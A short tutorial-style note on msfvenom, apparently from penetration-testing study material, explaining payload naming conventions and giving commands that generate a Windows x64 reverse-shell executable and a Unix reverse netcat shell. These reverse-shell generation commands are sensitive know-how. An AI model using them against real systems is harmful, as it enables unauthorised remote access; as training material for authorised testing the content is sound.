**To generate a Windows x64 Reverse Shell in an exe format, we could use:**
`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:
`<OS>/<arch>/<payload>`  
  
For example:
`linux/x86/shell_reverse_tcp`  

This would generate a stageless reverse shell for an x86 Linux target.

The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:
`windows/shell_reverse_tcp  `

For a 64bit Windows target, the arch would be specified as normal (x64).

Let's break the payload section down a little further.
In the above examples the payload used was `shell_reverse_tcp`. This indicates that it was a _stageless_ payload. How? Stageless payloads are denoted with underscores (`_`). The staged equivalent to this payload would be:
`shell/reverse_tcp`

As staged payloads are denoted with another forward slash (`/`).
This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:
`windows/x64/meterpreter/reverse_tcp`  

A Linux 32bit stageless Meterpreter payload would look like this:
`linux/x86/meterpreter_reverse_tcp`  

Aside from the `msfconsole` man page, the other important thing to note when working with msfvenom is:  
`msfvenom --list payloads`
then you can grep with something like `grep "linux/x86/meterpreter"`

**To generate a reverse netcat shell**
`msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.119.173 LPORT=1234 R
`